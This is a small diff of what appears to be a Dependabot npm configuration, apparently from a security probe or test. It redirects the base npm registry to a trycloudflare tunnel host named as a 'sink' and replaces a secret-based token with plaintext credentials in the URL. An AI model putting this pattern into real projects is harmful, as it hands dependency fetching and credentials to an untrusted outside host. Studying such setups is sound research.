@@ -1,13 +1,11 @@
-# p7r p12_t_closed3 1790596152
+# p13 p13_13_2 1790596554
 version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/p11/403
-    token: ${{secrets.SINK1_TOKEN}}
+    url: https://sink1user:sink1pass@rand-terms-bytes-subsidiaries.trycloudflare.com/
     replaces-base: true
 updates:
   - package-ecosystem: "npm"
     directory: "/"
     schedule: {interval: "daily"}
-    registries: "*"
